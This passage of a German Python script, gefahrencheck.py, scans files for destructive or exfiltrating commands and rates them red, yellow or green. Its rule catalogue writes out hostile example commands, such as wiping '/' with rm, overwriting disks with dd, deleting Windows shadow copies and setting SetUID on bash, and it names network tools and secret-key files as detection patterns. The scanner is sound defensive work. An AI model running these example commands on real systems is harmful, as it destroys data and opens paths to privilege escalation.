#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Christian Jelitte
"""
gefahrencheck.py - durchsucht Dateien und Ordner nach Befehlen, die ein System
nachhaltig beschädigen, eine Hintertür öffnen oder Daten abfließen lassen
können, und erstellt eine Übersicht mit Ampel.

Aufruf:
    python3 gefahrencheck.py PFAD [PFAD ...] [Optionen]

Beispiele:
    python3 gefahrencheck.py install.sh
    python3 gefahrencheck.py ./skripte ./doku/anleitung.md --html bericht.html
    python3 gefahrencheck.py ./skripte --kurz
    python3 gefahrencheck.py --regeln

    Einzelnen Befehl prüfen, z. B. als Sperre vor der Ausführung:
    python3 gefahrencheck.py --befehl 'rm -rf "$ZIEL"' --json
    echo "$BEFEHL" | python3 gefahrencheck.py -

    Bekannte Treffer einer geprüften Fassung festhalten und später nur Neues melden:
    python3 gefahrencheck.py ./anleitung --basis-schreiben anleitung.basis
    python3 gefahrencheck.py ./anleitung --basis anleitung.basis

    Eigene Regeln ergänzen, Regeln abschalten, Ergebnis für Code-Scanning:
    python3 gefahrencheck.py . --regeldatei eigene.json --ohne-regel PKG-INSTALL
    python3 gefahrencheck.py . --sarif ergebnis.sarif

Ampel:
    ROT   = mindestens ein Befehl, der Daten/System zerstören, eine Hintertür
            öffnen oder Geheimnisse ins Netz senden kann
    GELB  = riskant oder kontextabhängig - manuell prüfen
    GRÜN  = nichts Bekanntes gefunden (nicht: "sicher")
    HINWEIS = kein Ampelwert; z. B. Befehl in einer Variable, deren Verwendungen
              alle aufgelöst und geprüft wurden

Exit-Code: 0 = grün, 1 = gelb, 2 = rot, 3 = Aufruf-/Lesefehler oder nicht
vollständig geprüft (damit kann das Skript als automatische Vorab-Prüfung genutzt
werden)

Variablen: Wird ein Befehl in einer Variable abgelegt (X=rm, X=$(command -v rm)),
sucht das Skript alle Verwendungen von $X in derselben Datei. Sind alle aufgelöst
und geprüft, bleibt nur ein HINWEIS. Sonst bleibt GELB, und die Meldung nennt die
Zeilen, die nicht geprüft werden konnten (z. B. Verwendung vor der Zuweisung oder
neue Zuweisung mit unbekanntem Wert).

Kontext: Ein Befehl, der nur erwähnt wird - als Text von echo,
printf, grep oder print, im Kommentar, in einem Docstring oder im Fließtext
einer Markdown-Datei -, wird höchstens GELB gemeldet. Sobald dieselbe Zeile
etwas ausführt oder in eine Datei schreibt (| sh, $(...), >, eval, ssh ...),
gilt die volle Stufe. --ohne-kontext schaltet die Abstufung ab.

Wichtig: Das ist eine Mustersuche (Regex) mit einfacher Syntaxanalyse, keine
Ausführungsanalyse. Verschleierung über Variablen, Base64, printf/echo und
Zeichenketten-Zusammenbau wird teilweise aufgelöst, aber nicht vollständig.
GRÜN heißt "nichts Bekanntes gefunden", nicht "sicher".
Anweisungen in natürlicher Sprache ("lösche das Heimatverzeichnis") erkennt
das Skript nicht; es ist kein Schutz vor Prompt Injection.
"""

import argparse
import base64
import binascii
import fnmatch
import hashlib
import html
import json
import os
import re
import shlex
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Callable, Dict, Iterator, List, Optional, Tuple

VERSION = "3.2"

ROT, GELB, GRUEN = 2, 1, 0
STUFEN_NAME = {ROT: "ROT", GELB: "GELB", GRUEN: "GRÜN"}

# Befehlsanfang: kein Buchstabe/Ziffer/Bindestrich direkt davor
# (verhindert z. B. Treffer bei "docker run --rm" oder "perform")
B = r"(?<![\w-])"

# Blockgeräte und Speicher-Devices
DEV = (r"(?:sd[a-z]|hd[a-z]|vd[a-z]|xvd[a-z]|nvme\d|mmcblk\d|md\d|dm-\d|"
       r"mapper/|disk/|mem\b|kmem\b|port\b)")

# Dateinamen, die auf Schlüssel, Token oder Passwörter hindeuten
GEHEIM = (r"(?i:\.ssh(?:/|(?![\w.-]))|id_(?:rsa|ed25519|ecdsa)\b|\.pem\b|\.key\b|\bshadow\b|"
          r"(?:secret|token|passwor[dt]|credential|api[_-]?key)[\w.-]*)")

# Netzwerkzeuge, über die Daten das System verlassen können
NETZ = r"(?:curl|wget|nc|ncat|netcat|socat)"
NETZ_WORTE = ("curl", "wget", "nc", "ncat", "netcat", "socat")

# Längere Zeilen werden nur bis hierhin geprüft und als GELB gemeldet.
# Schützt vor extremen Laufzeiten bei eingebetteten Daten und minimiertem Code.
MAX_ZEILE = 20000

# Schlüsselwort-Vorfilter: eine Regel wird nur geprüft, wenn eines ihrer
# Wörter in der Zeile vorkommt. Nur für Tests abschaltbar.
VORFILTER = True

SYS_DIRS = {"bin", "boot", "dev", "etc", "home", "lib", "lib32", "lib64",
            "libx32", "opt", "proc", "root", "run", "sbin", "srv", "sys",
            "usr", "var", "mnt", "media"}
_SYS_ALT = "|".join(sorted(SYS_DIRS))

KRITISCHE_DATEIEN = {"/etc/passwd", "/etc/shadow", "/etc/group",
                     "/etc/gshadow", "/etc/sudoers", "/etc/fstab",
                     "/etc/crypttab"}

KRITISCHE_PAKETE = ["libc6", "glibc", "systemd", "sudo", "openssh-server",
                    "linux-image*", "kernel", "kernel-core", "grub*",
                    "coreutils", "bash", "dpkg", "apt", "rpm", "dnf",
                    "util-linux", "e2fsprogs", "base-files", "init",
                    "libpam*", "pam", "sysvinit-core", "base", "linux",
                    "pacman", "login", "passwd"]

# Kritischer Pfad als Zeichenkettenliteral in Python/JavaScript
_KRIT_PFAD = (r"(?:/|~/?|/(?:" + _SYS_ALT + r")/?|/etc/(?:passwd|shadow|group|gshadow|"
              r"sudoers|fstab|crypttab)|/boot/[^\"'`]*)")
_LIT_KRIT = r"[rbuRBU]?[\"'`]" + _KRIT_PFAD + r"[\"'`]"

# Schreibziel: Umleitung, tee, cp/mv/install
_SCHREIB = r"(?:>>?|" + B + r"tee\s+(?:-\S+\s+)*)\s*[\"']?"
_KOPIER = r"(?:>>?|" + B + r"tee\s+(?:-\S+\s+)*|" + B + r"(?:cp|mv|install|ln)\s+[^\n;|&]*\s)\s*[\"']?"


# --------------------------------------------------------------------------
# Hilfsfunktionen für Regeln, die mehr als ein Regex brauchen
# --------------------------------------------------------------------------

def _tokens(argstr: str) -> List[str]:
    """Argumente wie die Shell aufteilen; bei kaputten Quotes einfach splitten."""
    try:
        toks = shlex.split(argstr)
    except ValueError:
        toks = argstr.split()
    return [t.strip("\"'`),[]{}") for t in toks if t.strip("\"'`),[]{}")]


def _ziel_kritisch(t: str) -> bool:
    """Ist das Ziel / , ~ , $HOME oder ein Verzeichnis direkt unter / ?"""
    t = re.sub(r"/{2,}", "/", t)
    if t in {"/", "/*", "/.", "/.*", "~", "~/", "~/*", "$HOME", "${HOME}",
             "$HOME/", "$HOME/*", "${HOME}/", "${HOME}/*"}:
        return True
    m = re.fullmatch(r"/([A-Za-z0-9_]+)/?\*?", t)
    return bool(m and m.group(1) in SYS_DIRS)


def _datei_kritisch(t: str) -> bool:
    return (t in KRITISCHE_DATEIEN or t.startswith("/boot/")
            or t.startswith("/sys/firmware/efi"))


def _flags_und_ziele(toks: List[str]):
    flags, ziele, nach_doppelstrich = [], [], False
    for t in toks:
        if nach_doppelstrich:
            ziele.append(t)
        elif t == "--":
            nach_doppelstrich = True
        elif t.startswith("-") and len(t) > 1:
            flags.append(t)
        else:
            ziele.append(t)
    return flags, ziele


def _rekursiv(flags: List[str]) -> bool:
    return any(f == "--recursive" or
               (re.fullmatch(r"-[a-zA-Z]+", f) and ("r" in f or "R" in f))
               for f in flags)


def _rm_rot(m) -> bool:
    flags, ziele = _flags_und_ziele(_tokens(m.group(1)))
    rek = _rekursiv(flags)
    return any((rek and _ziel_kritisch(z)) or _datei_kritisch(z) for z in ziele)


def _rm_variable(m) -> bool:
    flags, ziele = _flags_und_ziele(_tokens(m.group(1)))
    return _rekursiv(flags) and any(
        re.match(r"^\$\{?[A-Za-z_]\w*\}?/", z) and ":?" not in z for z in ziele)


def _rm_rf(m) -> bool:
    flags, _ = _flags_und_ziele(_tokens(m.group(1)))
    force = any(f == "--force" or (re.fullmatch(r"-[a-zA-Z]+", f) and "f" in f)
                for f in flags)
    return _rekursiv(flags) and force


def _rechte_rot(m) -> bool:
    flags, ziele = _flags_und_ziele(_tokens(m.group(2)))
    return _rekursiv(flags) and any(_ziel_kritisch(z) for z in ziele)


def _mv_rot(m) -> bool:
    _, ziele = _flags_und_ziele(_tokens(m.group(1)))
    if len(ziele) < 2:
        return False
    quellen, ziel = ziele[:-1], ziele[-1]
    return ziel == "/dev/null" or any(_ziel_kritisch(q) for q in quellen)


def _find_kritisch(m) -> bool:
    return _ziel_kritisch(m.group(1).strip("\"'"))


def _find_sonst(m) -> bool:
    return not _find_kritisch(m)


def _paket_rot(m) -> bool:
    toks = _tokens(m.group(2))
    verben = {"remove", "purge", "erase", "autoremove", "-e", "-r", "-P",
              "--remove", "--purge"}
    hat_verb = any(t in verben or re.fullmatch(r"-R\w*", t) for t in toks)
    gewalt = any(t in {"--allow-remove-essential", "--force-all",
                       "--force-remove-essential", "--nodeps", "-Rdd"}
                 for t in toks)
    kritisch = any(fnmatch.fnmatch(t, p) for t in toks for p in KRITISCHE_PAKETE)
    return hat_verb and (kritisch or gewalt)


def _partition_nicht_nur_lesen(m) -> bool:
    rest = m.group(0) + " "
    return not re.search(r"\s(-l|--list|print|-s)\b", rest)


# --------------------------------------------------------------------------
# Regelkatalog
# --------------------------------------------------------------------------

@dataclass
class Regel:
    """Eine Regel. worte: Vorfilter (eines muss in der Zeile stehen, Groß-/Klein-
    schreibung egal). bsp/nicht: Beispiele, die treffen bzw. nicht treffen müssen;
    sie werden von --selbsttest und beim Laden einer Regeldatei geprüft."""
    id: str
    stufe: int
    kategorie: str
    titel: str
    muster: str
    pruefung: Optional[Callable] = None
    gruppe: Optional[str] = None
    worte: Tuple[str, ...] = ()
    bsp: Tuple[str, ...] = ()
    nicht: Tuple[str, ...] = ()
    danach: Optional[Dict[str, str]] = None
    regex: re.Pattern = field(init=False, repr=False)

    def __post_init__(self):
        self.regex = re.compile(self.muster)
        if self.gruppe is None:
            self.gruppe = self.id
        self.worte = tuple(w.lower() for w in self.worte)
        if self.danach:
            if self.pruefung is not None:
                raise ValueError("'danach' und eine Zusatzprüfung schließen sich aus")
            fehlt = [k for k in self.danach if k not in self.regex.groupindex]
            if fehlt:
                raise ValueError(f"'danach' nennt Gruppen, die im Muster fehlen: {', '.join(fehlt)}")
            self._rest = {k: re.compile(r"[^\n]*" + v) for k, v in self.danach.items()}
            self.pruefung = self.danach_pruefen

    # Regeln der Form KOPF[^\n]*REST: Das Muster findet nur den Kopf, zum Beispiel ein
    # Netzwerkzeug. Für die benannte Gruppe, die getroffen hat, muss REST irgendwo danach
    # in derselben Zeile stehen. Als ein einziges Regex wäre die Laufzeit quadratisch:
    # Bei einer Zeile aus tausend Köpfen ohne REST sucht die Regex-Maschine von jedem
    # Kopf aus bis zum Zeilenende. stellen() sucht dagegen je Gruppe höchstens einmal
    # vergeblich. Das verliert nichts: Fehlt REST hinter einem Kopf, fehlt er auch
    # hinter jedem späteren Kopf derselben Gruppe in derselben Zeile.

    def danach_gruppe(self, m: "re.Match") -> Optional[str]:
        return next((k for k in self._rest if m.group(k) is not None), None)

    def danach_pruefen(self, m: "re.Match") -> bool:
        k = self.danach_gruppe(m)
        return k is not None and self._rest[k].match(m.string, m.end()) is not None


MAX_STELLEN = 64  # je Regel und Zeile höchstens so viele Fundstellen auswerten


def stellen(regel: Regel, text: str) -> Iterator["re.Match"]:
    """Fundstellen der Regel, die auch die Zusatzprüfung bestehen.

    Gezählt werden nur bestandene Fundstellen. Würden verworfene mitzählen, ließe sich
    ein echter Treffer hinter 64 harmlosen verstecken (z. B. 64-mal "find . -delete;"
    vor "find / -delete"). Bei Regeln mit 'danach' werden Köpfe einer Gruppe, die
    schon einmal gescheitert ist, ohne erneute Suche übersprungen."""
    gefunden = 0
    gescheitert: set = set()
    for m in regel.regex.finditer(text):
        if regel.pruefung is None:
            ok = True
        elif regel.danach:
            k = regel.danach_gruppe(m)
            if k in gescheitert:
                continue
            ok = regel.danach_pruefen(m)
            if not ok:
                gescheitert.add(k)
        else:
            ok = regel.pruefung(m)
        if ok:
            yield m
            gefunden += 1
            if gefunden >= MAX_STELLEN:
                return


R = Regel
REGELN: List[Regel] = [
    # ---- Löschen ---------------------------------------------------------
    R("RM-ROOT", ROT, "Löschen",
      "rm auf / , ~ , Systemverzeichnis oder kritische Systemdatei",
      B + r"rm\s+([^;&|\n`]*)", _rm_rot, "rm", ("rm",),
      ("rm -rf /", "rm /etc/passwd", "sudo rm -rf --no-preserve-root /"),
      ("rm -rf ./build", "rm datei.txt")),
    R("RM-NOPRESERVE", ROT, "Löschen",
      "--no-preserve-root hebelt den Schutz vor 'rm -rf /' aus",
      r"--no-preserve-root\b", None, "rm", ("no-preserve-root",),
      ("rm -rf --no-preserve-root /",), ("rm -rf /tmp/x",)),
    R("RM-VAR", GELB, "Löschen",
      "rm -r auf \"$VAR/\" - ist die Variable leer, wird ab / gelöscht",
      B + r"rm\s+([^;&|\n`]*)", _rm_variable, "rm", ("rm",),
      ('rm -rf "$ZIEL/"',), ('rm -rf "${ZIEL:?}/"',)),
    R("RM-RF", GELB, "Löschen",
      "Rekursives Löschen ohne Rückfrage - Ziel prüfen",
      B + r"rm\s+([^;&|\n`]*)", _rm_rf, "rm", ("rm",),
      ("rm -rf ./build",), ("rm -r ./build", "rm -f x.lock")),
    R("FIND-DEL-ROOT", ROT, "Löschen",
      "find mit -delete / -exec rm ab / oder Systemverzeichnis",
      B + r"find\s+(\S+)[^\n]*?(?:-delete\b|-exec\s+(?:sudo\s+)?(?:/\S*/)?rm\b)",
      _find_kritisch, "find", ("find",),
      ("find / -name '*.log' -delete",), ("find . -name '*.pyc' -delete",)),
    R("FIND-DEL", GELB, "Löschen",
      "find mit -delete / -exec rm - Suchpfad und Filter prüfen",
      B + r"find\s+(\S+)[^\n]*?(?:-delete\b|-exec\s+(?:sudo\s+)?(?:/\S*/)?rm\b)",
      _find_sonst, "find", ("find",),
      ("find . -name '*.pyc' -delete",), ("find / -name x -print",)),
    R("MV-NULL", ROT, "Löschen",
      "mv nach /dev/null oder Verschieben von / bzw. Systemverzeichnissen",
      B + r"mv\s+([^;&|\n`]*)", _mv_rot, "mv", ("mv",),
      ("mv /etc /tmp/x", "mv daten.db /dev/null"), ("mv a.txt b.txt",)),
    R("PY-RMTREE", ROT, "Löschen",
      "Python shutil.rmtree auf / , ~ oder Systemverzeichnis",
      r"shutil\.rmtree\(\s*[\"'](?:/|~|/(?:" + _SYS_ALT + r")/?)[\"']", None, "rm",
      ("rmtree",), ("shutil.rmtree('/home')",), ("shutil.rmtree('/tmp/build')",)),
    R("PY-RMTREE-VAR", GELB, "Löschen",
      "shutil.rmtree auf einen Ausdruck statt eines festen Pfads - Ziel prüfen",
      r"shutil\.rmtree\(\s*(?![rbuRBU]?[\"'])[^)\s]", None, "rm", ("rmtree",),
      ("shutil.rmtree(pfad)",), ("shutil.rmtree('/tmp/build')",)),
    R("PY-DELETE", ROT, "Löschen",
      "Python löscht / , ~ , Systemverzeichnis oder kritische Systemdatei",
      r"\b(?:os\.(?:remove|unlink|rmdir|removedirs))\(\s*" + _LIT_KRIT + r"\s*[,)]|"
      r"\b(?:pathlib\.)?Path\(\s*" + _LIT_KRIT + r"\s*\)\.(?:unlink|rmdir)\(",
      None, "pydel", ("os.r", "os.unlink", "path("),
      ("os.remove('/etc/passwd')", "Path('/etc/shadow').unlink()"),
      ("os.remove(tmpdatei)", "os.remove('/tmp/x')")),
    R("JS-DELETE", ROT, "Löschen",
      "Node.js löscht / , ~ , Systemverzeichnis oder kritische Systemdatei",
      r"\b(?:(?:fs|fsp|fse|fs\.promises)\.(?:rm|rmSync|rmdir|rmdirSync|unlink|unlinkSync|"
      r"remove|removeSync|emptyDir|emptyDirSync)|rimraf(?:\.sync)?)\(\s*" + _LIT_KRIT,
      None, "jsdel", ("fs", "rimraf"),
      ("fs.rmSync('/', {recursive: true})", "rimraf('/home')"),
      ("fs.rmSync('./build', {recursive: true})",)),
    R("PS-DEL", ROT, "Löschen",
      "PowerShell löscht rekursiv ein Laufwerk, Windows- oder Benutzerverzeichnis",
      r"(?i)(?<![\w-])(?:Remove-Item|ri|rm|del|rd|rmdir|erase)\b(?=[^\n;|]*\s-Recurse\b)"
      r"(?=[^\n;|]*(?:\s[\"']?[A-Z]:\\?\*?[\"']?(?=\s|$)|\s[\"']?[A-Z]:\\(?:Windows|Users|Program)|"
      r"\$env:(?:SystemRoot|SystemDrive|USERPROFILE|windir|HOMEDRIVE|HOMEPATH)\b))",
      None, "psdel", ("-recurse",),
      ("Remove-Item -Recurse -Force C:\\", "Remove-Item $env:USERPROFILE -Recurse"),
      ("Remove-Item .\\build -Recurse -Force",)),
    R("PS-DEL-FORCE", GELB, "Löschen",
      "PowerShell löscht rekursiv ohne Rückfrage - Ziel prüfen",
      r"(?i)(?<![\w-])(?:Remove-Item|ri|rm|del|rd|rmdir|erase)\b(?=[^\n;|]*\s-Recurse\b)"
      r"(?=[^\n;|]*\s-Force\b)", None, "psdel", ("-recurse",),
      ("Remove-Item .\\build -Recurse -Force",), ("Remove-Item datei.txt",)),
    R("CMD-DEL", ROT, "Löschen",
      "cmd: Laufwerk oder Windows-/Benutzerverzeichnis rekursiv löschen",
      r"(?i)(?<![\w-])(?:del|erase|rd|rmdir)\b(?=[^\n&|]*\s/s\b)"
      r"(?=[^\n&|]*\s[\"']?[A-Z]:\\(?:\*(?:\.\*)?|Windows\b|Users\b)?[\"']?(?=\s|$))",
      None, "cmddel", ("del", "erase", "rd", "rmdir"),
      ("del /s /q C:\\*", "rd /s /q C:\\Windows"), ("del /s /q .\\build",)),
    R("CMD-DEL-S", GELB, "Löschen",
      "cmd: rekursiv ohne Rückfrage löschen (/s /q) - Ziel prüfen",
      r"(?i)(?<![\w-])(?:del|erase|rd|rmdir)\b(?=[^\n&|]*\s/s\b)(?=[^\n&|]*\s/q\b)",
      None, "cmddel", ("del", "erase", "rd", "rmdir"),
      ("del /s /q .\\build",), ("del datei.txt",)),
    R("HOME-SSH", GELB, "Löschen",
      "SSH- oder GPG-Schlüsselverzeichnis wird gelöscht, verschoben oder geleert",
      B + r"(?:rm|mv|shred|truncate)\b[^\n;|&]*\s[\"']?(?:~|\$HOME|\$\{HOME\}|/root|"
      r"/home/[^/\s]+)/\.(?:ssh|gnupg)/?(?=[\"'\s;|&)]|$)", None, "schluessel", (".ssh", ".gnupg"),
      ("mv ~/.ssh /tmp/x", "rm -rf ~/.gnupg"), ("ls ~/.ssh", "rm -f /home/bau/.ssh/authorized_keys")),
    R("FILE-EMPTY", GELB, "Löschen",
      "Datei wird geleert (Umleitung ohne Befehl, cp /dev/null)",
      r"(?:^\s*|[;&|(]\s*)(?::\s*|true\s*)?>(?![>&])\s*[\"']?[\w~/$.][^\s&;|]*[\"']?(?=\s*(?:$|[;&|]))|"
      + B + r"(?:cp\s+(?:-\S+\s+)*/dev/null\s+[\"']?[^\s&;|>]+|cat\s+/dev/null\s*>(?!>))",
      None, "leeren", (">", "/dev/null"),
      (": > /etc/hosts", "cp /dev/null app.log", "> ausgabe.txt"),
      ("echo hallo > ausgabe.txt", "ls > liste.txt", "> Hinweis: bitte lesen")),

    # ---- Versionsverwaltung, Datenbanken, Cloud ------------------------------
    R("GIT-DESTROY", GELB, "Daten",
      "Git verwirft den Arbeitsstand oder überschreibt/löscht entfernte Historie",
      B + r"git\s+(?:-\S+\s+)*(?:clean\s+(?:-\S*\s+)*-\w*f|reset\s+(?:-\S+\s+)*--hard\b|"
      r"push\b[^\n;|&]*(?:\s--force\b|\s-f\b|\s--mirror\b|\s--delete\b|\s:\S)|"
      r"checkout\s+(?:-f\s+)?--\s+\.|branch\s+-D\b|filter-(?:branch|repo)\b|"
      r"reflog\s+expire\b[^\n;]*--expire=(?:now|all)|gc\b[^\n;]*--prune=now|stash\s+clear\b)",
      None, "git", ("git",),
      ("git clean -fdx", "git reset --hard origin/main", "git push --force origin main"),
      ("git clean -n", "git push origin main", "git reset --soft HEAD~1")),
    R("DB-DROP", GELB, "Daten",
      "Datenbank, Schema oder Tabelle löschen bzw. vollständig leeren",
      r"(?i)\b(?:drop\s+(?:database|schema|table|collection)\b|"
      r"truncate\s+(?:table\s+)?[\w.\"`\[\]]+\s*;|delete\s+from\s+[\w.\"`\[\]]+\s*(?:;|$|[\"'])|"
      r"flushall\b|flushdb\b|\.drop(?:Database|Collection)?\(\)|dropdb\s)",
      None, "db", ("drop", "truncate", "delete", "flush"),
      ("DROP DATABASE produktion;", "mysql -e 'DROP TABLE kunden'", "DELETE FROM kunden;",
       "redis-cli FLUSHALL"),
      ("SELECT * FROM kunden;", "DELETE FROM kunden WHERE id = 3;")),
    R("CLOUD-DESTROY", ROT, "Daten",
      "Cloud-, Cluster- oder Infrastruktur-Ressourcen ohne Rückfrage zerstören",
      B + r"(?:(?:terraform|tofu)\s+(?:destroy\b[^\n;|&]*-auto-approve|apply\b(?=[^\n;|&]*-destroy\b)"
      r"[^\n;|&]*-auto-approve)|kubectl\s+(?:-\S+\s+)*delete\s+(?:(?:ns|namespaces?)\b|[^\n;|&]*--all\b)|"
      r"aws\s+s3\s+(?:rb\b[^\n;|&]*--force|rm\b[^\n;|&]*--recursive)|gsutil\s+(?:-m\s+)?rm\s+-r|"
      r"gcloud\s+(?:storage\s+rm\b[^\n;|&]*(?:-r\b|--recursive)|projects\s+delete\b)|"
      r"az\s+group\s+delete\b[^\n;|&]*(?:--yes|-y\b))",
      None, "cloud", ("terraform", "tofu", "kubectl", "aws", "gsutil", "gcloud", "az"),
      ("terraform destroy -auto-approve", "kubectl delete namespace prod",
       "aws s3 rm s3://b --recursive", "az group delete -n rg --yes"),
      ("terraform plan", "kubectl delete pod web-1")),
    R("CLOUD-DEL", GELB, "Daten",
      "Cloud-, Cluster- oder Infrastruktur-Ressourcen löschen - Ziel prüfen",
      B + r"(?:(?:terraform|tofu)\s+destroy\b|kubectl\s+(?:-\S+\s+)*delete\b|helm\s+(?:uninstall|delete)\b|"
      r"aws\s+\S+\s+(?:delete-|terminate-|rb\b|rm\b)|gcloud\s+[^\n;|&]*\bdelete\b|"
      r"az\s+[^\n;|&]*\bdelete\b|gsutil\s+(?:-m\s+)?rm\b)",
      None, "cloud", ("terraform", "tofu", "kubectl", "helm", "aws", "gsutil", "gcloud", "az"),
      ("terraform destroy", "kubectl delete pod web-1", "helm uninstall web",
       "aws ec2 terminate-instances --instance-ids i-1"),
      ("kubectl get pods", "terraform apply")),
    R("RSYNC-DELETE", GELB, "Daten",
      "rsync --delete löscht im Ziel alles, was in der Quelle fehlt",
      B + r"rsync\b[^\n;|&]*\s--(?:delete|del|remove-source-files)\b", None, "rsync", ("rsync",),
      ("rsync -a --delete leer/ /home/",), ("rsync -a quelle/ ziel/",)),

    # ---- Datenträger direkt überschreiben ------------------------------------
    R("DD-DEV", ROT, "Datenträger",
      "dd schreibt direkt auf ein Blockgerät (überschreibt Partitionen/Daten)",
      B + r"dd\b[^\n|;&]*\bof=[\"']?/dev/" + DEV, None, "blockdev", ("dd",),
      ("dd if=/dev/zero of=/dev/sda bs=1M",), ("dd if=/dev/zero of=disk.img bs=1M",)),
    R("REDIR-DEV", ROT, "Datenträger",
      "Umleitung/tee direkt auf Blockgerät oder Speicher-Device",
      r"(?:>|" + B + r"tee\s+(?:-\S+\s+)*)\s*[\"']?/dev/" + DEV, None, "blockdev", ("/dev/",),
      ("cat x.img > /dev/sda",), ("echo x > /dev/null",)),
    R("CP-DEV", ROT, "Datenträger",
      "cp direkt auf ein Blockgerät",
      B + r"cp\s+(?:-\S+\s+)*\S+\s+[\"']?/dev/" + DEV, None, "blockdev", ("/dev/",),
      ("cp image.iso /dev/sdb",), ("cp a b",)),
    R("SHRED-DEV", ROT, "Datenträger",
      "shred auf ein Gerät - Daten unwiederbringlich überschrieben",
      B + r"shred\b[^\n;|&]*\s[\"']?/dev/", None, "blockdev", ("shred",),
      ("shred -n 1 /dev/sda",), ("shred geheim.txt",)),
    R("WIPE", ROT, "Datenträger",
      "wipefs/blkdiscard - löscht Signaturen bzw. verwirft alle Blöcke (SSD)",
      B + r"(?:wipefs|blkdiscard)\b", None, "blockdev", ("wipefs", "blkdiscard"),
      ("wipefs -a /dev/sdb", "blkdiscard /dev/nvme0n1"), ("lsblk",)),
    R("SECURE-ERASE", ROT, "Datenträger",
      "Hardware-Löschung (hdparm secure erase / nvme format|sanitize)",
      B + r"(?:hdparm\b[^\n;]*--security-erase|nvme\s+(?:format|sanitize)\b)",
      None, "blockdev", ("hdparm", "nvme"),
      ("nvme format /dev/nvme0n1",), ("nvme list",)),
    R("WIN-DISK", ROT, "Datenträger",
      "Windows: Datenträger formatieren/löschen, Schattenkopien oder Sicherungen entfernen",
      r"(?i)(?:\bFormat-Volume\b|\bClear-Disk\b|\bInitialize-Disk\b|(?<![\w-])format(?:\.com)?\s+[A-Z]:(?!\w)|"
      r"\bdiskpart\b[^\n]*\bclean\b|vssadmin(?:\.exe)?\s+delete\s+shadows|wmic\s+shadowcopy\s+delete|"
      r"wbadmin\s+delete\s+(?:catalog|systemstatebackup|backup)|bcdedit[^\n]*recoveryenabled\s+no|"
      r"cipher(?:\.exe)?\s+/w:)",
      None, "blockdev", ("format", "clear-disk", "initialize-disk", "diskpart", "vssadmin",
                         "shadowcopy", "wbadmin", "bcdedit", "cipher"),
      ("Format-Volume -DriveLetter D", "vssadmin delete shadows /all /quiet", "format c: /q"),
      ("Get-Volume", "Das Format ist neu.")),

    # ---- Partitionen, Dateisysteme, Volumes -----------------------------------
    R("MKFS", ROT, "Dateisystem",
      "Dateisystem anlegen - vorhandene Daten auf dem Ziel sind weg",
      B + r"(?:mkfs(?:\.\w+)?|mke2fs|mkswap|mkntfs|mkdosfs)\b", None, "fs",
      ("mkfs", "mke2fs", "mkswap", "mkntfs", "mkdosfs"),
      ("mkfs.ext4 /dev/vda1", "mkswap /dev/sdb2"), ("mkdir neu",)),
    R("PART-DESTROY", ROT, "Dateisystem",
      "Partitionstabelle löschen/neu anlegen (sgdisk -Z/-o, parted mklabel/rm, sfdisk --delete)",
      B + r"(?:sgdisk\b[^\n;]*?(?:--zap-all|--zap\b|-Z\b|--clear\b|-o\b)|"
      r"parted\b[^\n;]*\s(?:rm|mklabel|mktable)\b|sfdisk\b[^\n;]*--delete)",
      None, "partition", ("sgdisk", "parted", "sfdisk"),
      ("sgdisk --zap-all /dev/sda", "parted /dev/sda mklabel gpt"), ("parted /dev/sda print",)),
    R("PART-TOOL", GELB, "Dateisystem",
      "Partitionierungswerkzeug (interaktiv) - Zielgerät prüfen",
      B + r"(?:fdisk|gdisk|cfdisk|sfdisk|parted)\b[^\n;|&]*",
      _partition_nicht_nur_lesen, "partition", ("disk", "parted"),
      ("fdisk /dev/sda",), ("fdisk -l",)),
    R("LUKS", ROT, "Dateisystem",
      "LUKS-Header neu anlegen/löschen - verschlüsselte Daten unlesbar",
      B + r"cryptsetup\s+(?:\S+\s+)*?(?:luksFormat|luksErase|erase)\b", None, "fs", ("cryptsetup",),
      ("cryptsetup luksFormat /dev/sda2",), ("cryptsetup open /dev/sda2 daten",)),
    R("RAID-LVM-ZFS", ROT, "Dateisystem",
      "RAID-Superblock, LVM-Volume oder ZFS-Pool/Dataset zerstören",
      B + r"(?:mdadm\b[^\n;]*--zero-superblock|zpool\s+(?:destroy|labelclear)\b|"
      r"zfs\s+destroy\b|lvremove\b|vgremove\b|pvremove\b)", None, "fs",
      ("mdadm", "zpool", "zfs", "lvremove", "vgremove", "pvremove"),
      ("zpool destroy tank", "lvremove /dev/vg0/daten"), ("zpool status",)),
    R("BTRFS-DEL", GELB, "Dateisystem",
      "btrfs-Subvolume löschen",
      B + r"btrfs\s+subvolume\s+delete\b", None, "fs", ("btrfs",),
      ("btrfs subvolume delete /mnt/@alt",), ("btrfs subvolume list /",)),

    # ---- Rechte & Besitz ------------------------------------------------------
    R("PERM-ROOT", ROT, "Rechte",
      "chmod/chown/chgrp rekursiv auf / oder Systemverzeichnis",
      B + r"(chmod|chown|chgrp)\s+([^;&|\n`]*)", _rechte_rot, "rechte", ("chmod", "chown", "chgrp"),
      ("chmod -R 777 /etc", "chown -R nobody /usr"), ("chmod -R 755 ./web",)),
    R("CHMOD-777", GELB, "Rechte",
      "chmod 777 - jeder darf alles schreiben/ausführen",
      B + r"chmod\s+(?:-\S+\s+)*[0-7]?777\b", None, "rechte", ("777",),
      ("chmod 777 datei",), ("chmod 755 datei",)),
    R("CHMOD-000", GELB, "Rechte",
      "chmod 000 entzieht alle Rechte - Zugriff und Dienste brechen",
      B + r"chmod\s+(?:-\S+\s+)*0?000\b", None, "rechte", ("000",),
      ("chmod -R 000 /home/u",), ("chmod 0644 datei",)),
    R("SETUID", GELB, "Rechte",
      "SetUID/SetGID-Bit setzen - mögliche Rechteausweitung",
      B + r"chmod\s+(?:-\S+\s+)*(?:[ugoa]*\+[rwx]*s|[2-7][0-7]{3})\b", None, "setuid", ("chmod",),
      ("chmod u+s /bin/bash", "chmod 4755 prog"), ("chmod u+x skript.sh",)),
    R("CHATTR-I", GELB, "Rechte",
      "chattr +i macht Dateien unveränderbar (auch für root)",
      B + r"chattr\s+(?:-\S+\s+)*\+i\b", None, "chattr", ("chattr",),
      ("chattr +i /etc/resolv.conf",), ("lsattr datei",)),

    # ---- Systemdateien, Pakete, Boot -----------------------------------------
    R("ETC-OVERWRITE", ROT, "System",
      "Überschreiben von passwd/shadow/sudoers/fstab (Login/Boot kaputt)",
      r"(?:(?<!>)>(?!>)|" + B + r"tee\s+(?:(?!-a\b|--append\b)-\S+\s+)*|" + B +
      r"cp\s+(?:-\S+\s+)*/dev/null\s+)\s*[\"']?"
